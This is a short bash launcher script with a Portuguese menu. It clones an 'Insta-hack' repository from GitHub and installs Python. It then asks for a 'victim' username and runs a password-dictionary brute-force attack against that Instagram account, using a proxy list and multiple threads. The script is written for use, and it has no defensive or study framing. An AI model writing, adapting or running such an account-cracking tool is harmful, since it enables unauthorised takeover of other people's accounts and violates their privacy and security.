#!/usr/bin/bash/
#
#
git clone https://github.com/RetroAk/Insta-hack
apt install python3
apt install python
apt install python2
cd Insta-hack
clear
figlet Instahack2
#
#MENU
echo
echo "========================================================="
echo "= \033[1;36m[\033[1;36m1]>> \033[1;33mInvadir uma conta"
echo "= \033[1;36m[\033[1;36m2]>> \033[1;33mSair"
echo "========================================================="
echo
read -p "[+]=>" instahack
#
clear
figlet Instahack2
echo "\033[1;32m\n\n[+]=>DIGITE OU COLE O NOME DA VÍTIMA exe:(pedro1234)"
#
read -p "[+]=>" vitima
echo
#iniciando o ataque
#
python Insta.py -u $vitima -w /data/data/com.termux/files/home/instahackv2/dic-ptbr-utf8.txt -p prox.txt -t 4 -d -v
exit
